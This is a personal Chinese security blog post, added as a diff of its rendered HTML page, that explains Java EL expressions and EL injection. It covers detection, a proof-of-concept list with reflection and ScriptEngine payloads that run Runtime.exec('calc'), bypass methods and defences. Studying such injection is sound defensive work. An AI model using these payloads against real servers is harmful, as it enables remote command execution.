@@ -1,0 +1,439 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="表达式注入--EL表达式" />
+
+
+<meta name="description" content="好久没更新博客了，今天有空来学习一下EL表达式注入。
+EL概述EL是一种语言，为了简化JSP的写法。它的功能有四个：
+
+获取数据：替换JSP页面的脚本表达式，使用${user}等形式获取数据。
+..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    表达式注入--EL表达式 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="表达式注入--EL表达式">
+            
+            表达式注入--EL表达式
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="tag">表达式注入--EL表达式</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/12/25</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>好久没更新博客了，今天有空来学习一下EL表达式注入。</p>
+<h1 id="EL概述"><a href="#EL概述" class="headerlink" title="EL概述"></a>EL概述</h1><p>EL是一种语言，为了简化JSP的写法。它的功能有四个：</p>
+<ul>
+<li>获取数据：替换JSP页面的脚本表达式，使用<code>${user}</code>等形式获取数据。</li>
+<li>执行运算：在JSP页面执行一些基本的运算，如：<code>${100-99}</code>，执行后页面应该返回1.</li>
+<li>获取对象：EL表达式定义了一些隐式对象，通过EL获取对象之后就可以直接访问其中数据。</li>
+<li>调用JAVA方法：可以通过<code>${np: 函数名(参数)}</code>调用方法，np是值命名空间。</li>
+</ul>
+<h1 id="JSP形式"><a href="#JSP形式" class="headerlink" title="JSP形式"></a>JSP形式</h1><ul>
+<li>JSP表达式：&lt;%=变量或表达式%&gt;</li>
+<li>JSP脚本：&lt;%JAVA代码%&gt;</li>
+<li>JSP声明：&lt;%!变量或方法%&gt;</li>
+<li>JSP注释：&lt;%!–JSP注释–%&gt;</li>
+</ul>
+<h1 id="EL的使用"><a href="#EL的使用" class="headerlink" title="EL的使用"></a>EL的使用</h1><h2 id="查找变量值返回"><a href="#查找变量值返回" class="headerlink" title="查找变量值返回"></a>查找变量值返回</h2><p>想要获取某个变量的值：<code>${username}</code>, 但是这个username没有指定范围，不知道它是哪里的username（默认是在page)。这时候就得涉及到EL的查找范围了。</p>
+<ul>
+<li>page，页面范围内，使用pageScope去调用访问，如：<code>${pageScope.username}</code>, 还有：<code>${pageScope.objectName.attributeName}</code>, 访问某个对象的属性。</li>
+<li>request, 请求范围内，使用requestScope。</li>
+<li>session，会话范围内，使用sessionScope</li>
+<li>application, 应用范围内，使用applicationScope</li>
+</ul>
+<h2 id="获取隐式对象"><a href="#获取隐式对象" class="headerlink" title="获取隐式对象"></a>获取隐式对象</h2><p>pageContext, JSP页面的上下文，可以用于访问隐式变量（以下），如<code>${pageContext.response}</code>为页面的响应对象赋值，<code>${pageContext.request.queryString}</code>，返回请求的参数和值，即：name=xxx。</p>
+<ul>
+<li>param，请求参数，单个，<code>${param.name}</code>, 返回请求参数name的值</li>
+<li>paramValues，请求参数，数值数组。<code>${paramValues.name}</code>，返回字符串数组</li>
+<li>header，头部，单个，<code>${header.name}</code></li>
+<li>headerValues，头部，数值数组,${headerValues.name}`</li>
+<li>cookie，单个cookie对象,  <code>${cookie.name.value}</code>, 如果是多个同名的cookie，用：<code>${headerValues.name}</code></li>
+<li>initParam，将上下文初始化参数名称映射到单个值。</li>
+</ul>
+<p><strong>注意：有些变量不能用.访问，必须用[], 如：${header[“user-Agent”]}</strong></p>
+<h2 id="调用JAVA方法"><a href="#调用JAVA方法" class="headerlink" title="调用JAVA方法"></a>调用JAVA方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class ELFunc &#123;</span><br><span class="line">    public static String doSomething(String str)&#123;</span><br><span class="line">        return str + &quot;.com&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建一个类ELFunc, 其中有一个doSomething方法。这个类和方法必须在WEB-INF下新建一个test.tld文件中指定。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;taglib version&#x3D;&quot;2.0&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&quot;</span><br><span class="line">    xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">    xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&#x2F;web-jsptaglibrary_2_0.xsd&quot;&gt;</span><br><span class="line">    &lt;tlib-version&gt;1.0&lt;&#x2F;tlib-version&gt;</span><br><span class="line">    &lt;short-name&gt;ELFunc&lt;&#x2F;short-name&gt;</span><br><span class="line">    &lt;uri&gt;http:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;ELFunc&lt;&#x2F;uri&gt;</span><br><span class="line">    &lt;function&gt;</span><br><span class="line">        &lt;name&gt;doSomething&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;function-class&gt;eltest.ELFunc&lt;&#x2F;function-class&gt;</span><br><span class="line">        &lt;function-signature&gt; java.lang.String doSomething(java.lang.String)&lt;&#x2F;function-signature&gt;</span><br><span class="line">    &lt;&#x2F;function&gt;</span><br><span class="line">&lt;&#x2F;taglib&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后在JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用<code>类名:方法名()</code>的形式来调用该类方法即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@taglib uri&#x3D;&quot;http:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;ELFunc&quot; prefix&#x3D;&quot;ELFunc&quot;%&gt;</span><br><span class="line">$&#123;ELFunc:doSomething(&quot;mi1k7ea&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="启动或禁用EL表达式"><a href="#启动或禁用EL表达式" class="headerlink" title="启动或禁用EL表达式"></a>启动或禁用EL表达式</h1><h2 id="全局禁用"><a href="#全局禁用" class="headerlink" title="全局禁用"></a>全局禁用</h2><p>打开web.xml文件，进行如下配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp-config&gt;</span><br><span class="line">	&lt;jsp-property-group&gt;</span><br><span class="line">		&lt;url-pattern&gt;*.jsp&lt;&#x2F;url-pattern&gt;</span><br><span class="line">		&lt;el-ignored&gt;true&lt;&#x2F;el-ignored&gt;</span><br><span class="line">	&lt;&#x2F;jsp-property-group&gt;</span><br><span class="line">&lt;&#x2F;jsp-config&gt;</span><br></pre></td></tr></table></figure>
+
+<p>el-ignored标签中的值设置为true即禁用，false即启用。</p>
+<h2 id="局部禁用"><a href="#局部禁用" class="headerlink" title="局部禁用"></a>局部禁用</h2><p>对于单个JSP文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored&#x3D;&quot;true&quot; %&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="EL表达式注入漏洞"><a href="#EL表达式注入漏洞" class="headerlink" title="EL表达式注入漏洞"></a>EL表达式注入漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>使用表达式，提供外部接口，并且对外部输入没有进行严格过滤，导致攻击者可以输入恶意表达式从而执行。</p>
+<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>使用运算：</p>
+<p><code>http://xxx.com/xx.jsp?user=${2-1}</code></p>
+<p>返回1，便是执行了减法运算。然后搜索页面HTML代码看这个1在哪输出了。</p>
+<p>使用POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line">&#x2F;&#x2F;获取Web路径</span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;</span><br><span class="line">&#x2F;&#x2F;文件头参数</span><br><span class="line">$&#123;header&#125;</span><br><span class="line">&#x2F;&#x2F;获取webRoot</span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line">&#x2F;&#x2F;执行命令</span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;).getInputStream())&#125;</span><br><span class="line">&#x2F;&#x2F;任意代码执行</span><br><span class="line">$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="CVE-2011-2730"><a href="#CVE-2011-2730" class="headerlink" title="CVE-2011-2730"></a>CVE-2011-2730</h2><h2 id="乌云上的漏洞案例"><a href="#乌云上的漏洞案例" class="headerlink" title="乌云上的漏洞案例"></a>乌云上的漏洞案例</h2><p><a href="https://www.secshi.com/goto/wqmz" target="_blank" rel="noopener">https://www.secshi.com/goto/wqmz</a></p>
+<p><a href="https://www.secshi.com/goto/q1hy" target="_blank" rel="noopener">https://www.secshi.com/goto/q1hy</a></p>
+<h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="利用反射机制"><a href="#利用反射机制" class="headerlink" title="利用反射机制"></a>利用反射机制</h2><p>即前面的POC</p>
+<h2 id="利用ScriptEngine调用JS引擎"><a href="#利用ScriptEngine调用JS引擎" class="headerlink" title="利用ScriptEngine调用JS引擎"></a>利用ScriptEngine调用JS引擎</h2><p>同SpELl注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&#39;&#39;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#39;calc&#39;)&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul>
+<li><p>不使用外部输入作为表达式内容</p>
+</li>
+<li><p>严格过滤输入</p>
+</li>
+<li><p>对源代码排查</p>
+<p>EL部分的内容在javax.el包中，这个包在JUEL相关包中，源代码直接搜索：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7692" target="_blank" rel="noopener">https://xz.aliyun.com/t/7692</a></p>
+<p><a href="https://www.cnblogs.com/xdp-gacl/p/3938361.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdp-gacl/p/3938361.html</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2021/01/01/MQ%E9%98%9F%E5%88%97-C-%E5%AE%9E%E7%8E%B0/" class="pre-post btn btn-default" title='MQ队列-C++实现'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            MQ队列-C++实现</span>
+    </a>
+    
+    
+    <a href="/2020/11/07/pwn%E5%85%A5%E9%97%A8-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%BA%A2%E5%87%BA/" class="next-post btn btn-default" title='pwn入门-最简单的溢出'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            pwn入门-最简单的溢出</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EL概述"><span class="toc-text">EL概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JSP形式"><span class="toc-text">JSP形式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EL的使用"><span class="toc-text">EL的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查找变量值返回"><span class="toc-text">查找变量值返回</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取隐式对象"><span class="toc-text">获取隐式对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调用JAVA方法"><span class="toc-text">调用JAVA方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#启动或禁用EL表达式"><span class="toc-text">启动或禁用EL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#全局禁用"><span class="toc-text">全局禁用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#局部禁用"><span class="toc-text">局部禁用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EL表达式注入漏洞"><span class="toc-text">EL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测"><span class="toc-text">检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞"><span class="toc-text">漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2011-2730"><span class="toc-text">CVE-2011-2730</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#乌云上的漏洞案例"><span class="toc-text">乌云上的漏洞案例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过方法"><span class="toc-text">绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用反射机制"><span class="toc-text">利用反射机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用ScriptEngine调用JS引擎"><span class="toc-text">利用ScriptEngine调用JS引擎</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#防御"><span class="toc-text">防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
